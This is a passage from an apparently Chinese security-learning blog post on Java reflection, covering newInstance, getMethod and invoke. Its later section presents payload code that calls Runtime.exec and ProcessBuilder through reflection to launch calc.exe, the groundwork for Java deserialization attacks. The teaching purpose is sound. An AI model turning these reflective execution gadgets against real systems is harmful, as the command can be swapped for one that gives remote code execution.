+<h2 id="2-执行方法"><a href="#2-执行方法" class="headerlink" title="2. 执行方法"></a>2. 执行方法</h2><h3 id="2-1-newInstance"><a href="#2-1-newInstance" class="headerlink" title="2.1 newInstance"></a>2.1 newInstance</h3><p>class.newInstance()的作用就是调用一个类的无参构造函数。但是我们有时候使用这个方法的时候会失败一般情况可能是一下两种：</p>
+<ul>
+<li>使用的类没有无参构造函数</li>
+<li>使用的类构造函数是私有的</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.servlet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br></pre></td></tr></table></figure>
+
+<p>这里本质上是调用了无参构造器。</p>
+<h3 id="2-2-获取方法"><a href="#2-2-获取方法" class="headerlink" title="2.2 获取方法"></a>2.2 获取方法</h3><p><strong>getMethods() 获取全部public方法</strong>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.servlet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">        Method[] methods = clazz.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b&gt;a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b-a;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public int com.yicunyiye.servlet.Person.add(int,int)</span><br><span class="line">public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException</span><br><span class="line">public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException</span><br><span class="line">public final void java.lang.Object.wait() throws java.lang.InterruptedException</span><br><span class="line">public boolean java.lang.Object.equals(java.lang.Object)</span><br><span class="line">public java.lang.String java.lang.Object.toString()</span><br><span class="line">public native int java.lang.Object.hashCode()</span><br><span class="line">public final native java.lang.Class java.lang.Object.getClass()</span><br><span class="line">public final native void java.lang.Object.notify()</span><br><span class="line">public final native void java.lang.Object.notifyAll()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>getMethod() 获取指定的public方法</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">Method add = clazz.getMethod(<span class="string">&quot;add&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(add);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果这里写获取sub方法，那么会报错</p>
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831001840425.png?raw=true"></p>
+<p><strong>getDeclaredMethods() 获取全部方法</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (Method declaredMethod : clazz.getDeclaredMethods()) &#123;</span><br><span class="line">    System.out.println(declaredMethod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public int com.yicunyiye.servlet.Person.add(int,int)</span><br><span class="line">private int com.yicunyiye.servlet.Person.sub(int,int)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>getDeclaredMethod() 获取指定方法，无论是否为public</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">Method add = clazz.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">Method sub = clazz.getDeclaredMethod(<span class="string">&quot;sub&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(add);</span><br><span class="line">System.out.println(sub);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public int com.yicunyiye.servlet.Person.add(int,int)</span><br><span class="line">private int com.yicunyiye.servlet.Person.sub(int,int)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-执行方法：invoke"><a href="#2-3-执行方法：invoke" class="headerlink" title="2.3 执行方法：invoke"></a>2.3 执行方法：invoke</h3><p>之前说过invoke的第一个参数</p>
+<ul>
+<li>如果这个方法是一个普通方法，那么第一个参数就是类对象</li>
+<li>如果这个方法是一个静态方法，那么第一个参数就是类</li>
+</ul>
+<p>Person类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b&gt;a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b-a;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>先来试试普通方法add：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">Person user3 = (Person)clazz.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">Method add = clazz.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(add.invoke(user3, <span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>分析：</p>
+<p>先获取类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后获取类对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person user3 = (Person)clazz.getConstructor().newInstance();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再获取方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method add = clazz.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后执行，因为这里的<code>add()</code>是普通方法，所以invoke的第一个参数是类对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(add.invoke(user3, <span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我们如果把第一个参数从类对象改为类运行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(add.invoke(clazz, <span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831003203151.png?raw=true" alt="image-20210831003203151"></p>
+<p>可以看到就会报错。</p>
+<p><strong>再来试试静态方法sub:</strong></p>
+<p>还是按照原来的,invoke第一个参数设置为类对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">Person user3 = (Person)clazz.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">Method add = clazz.getDeclaredMethod(<span class="string">&quot;sub&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(add.invoke(user3, <span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831003314575.png?raw=true"></p>
+<p>成功运行。</p>
+<p>然后invoke第一个参数改为clazz类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.yicunyiye.servlet.Person&quot;</span>);</span><br><span class="line">Person user3 = (Person)clazz.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">Method add = clazz.getDeclaredMethod(<span class="string">&quot;sub&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(add.invoke(clazz, <span class="number">1</span>, <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831003357206.png?raw=true"></p>
+<h3 id="2-4-java-lang-Runtime类利用"><a href="#2-4-java-lang-Runtime类利用" class="headerlink" title="2.4 java.lang.Runtime类利用"></a>2.4 java.lang.Runtime类利用</h3><p>我们在构造payload 的时候常会用到<code>java.lang.Runtime</code>这个类</p>
+<p>前面说过：class.newInstance()的作用就是调用一个类的无参构造函数。但是使用的类没有无参构造函数或者使用的类构造函数是私有的就会失败</p>
+<p>按照正常来说通过一下代码就能成功执行calc.exe</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是运行的时候可以看到存在报错</p>
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831003815572.png?raw=true"></p>
+<p>跳到Runtime类可以看到构造方法是一个私有方法</p>
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831003910883.png?raw=true"></p>
+<p>这种被称之为单例模式，具体可以自行查看<a target="_blank" rel="noopener" href="https://www.runoob.com/design-pattern/singleton-pattern.html">链接</a>。这种只有在类初始化的时候会被执行一次构造函数，后面只能通过<code>getRuntime()</code>方法来获取这个对象。</p>
+<p>exec方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> exec(command, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么将上面payload改为如下即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.servlet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method getRuntime = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Method exec = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        Object runtime = getRuntime.invoke(clazz);</span><br><span class="line">        exec.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先获取<code>java.lang.Runtime</code>类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为<code>Runtime</code>是单例模式，且<code>exec</code>是普通方法，那么要调用它的时候第一个参数就是类对象。后面只能通过<code>getRuntime()</code>方法来获取这个对象，所以这里要获取<code>getRuntime()</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntime = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再获取<code>exec</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method exec = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再调用<code>getRuntime()</code>方法去获取类对象,因为<code>getRuntime()</code>方法是一个静态方法，所以只需要类就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object runtime = getRuntime.invoke(clazz);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再使用通过<code>getRuntime()</code>方法获取到的类对象作为<code>exec.invoke()</code>的第一个参数传递</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210831010007946.png?raw=true"></p>
+<p>合并：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yicunyiye.servlet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用<code>java.lang.Runtime</code>，那么如果出现一下问题：</p>
+<ul>
+<li>如果一个类没有无参构造方法，也没有单例模式的静态方法</li>
+<li>如果一个方法或者构造函数是私有方法，如何获取它</li>
+</ul>
+<p>我们还有种执行命令的方法是使用<code>ProcessBuilder</code></p>
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210904003315707.png?raw=true"></p>
+<p>可以看到他又两种构造函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(String... command)</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>如何利用呢？可以使用<code>getConstructor</code>，参数就是构造函数列表类型。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://github.com/yicunyiye/img/blob/master/image-20210904003746673.png?raw=true"></p>
+<p>我们使用的是<code>public ProcessBuilder(List&lt;String&gt; command)</code>所以<code>getConstructor</code>传入的是<code>List.class</code>，然后再使用<code>Arrays.asList</code>方法把<code>calc.exe</code>字符串转换为<code>List</code>类型。然后调用<code>start()</code>方法执行。但是这里使用了强制转换。我们使用反射来实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        Method start = clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先获取<code>java.lang.ProcessBuilder</code>类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后获取<code>start()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method start = clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后再调用<code>invoke</code>去执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里是调用的第一种：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>我们一样可以通过调用第二种：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(String... command)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在java中，如果我们不确定有多少个参数我们可以用<code>...</code>这种语法，比如说：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String[] names)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String... names)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下数组也是可以直接赋值给names的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;; </span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRuntime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        Method start = clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        start.invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
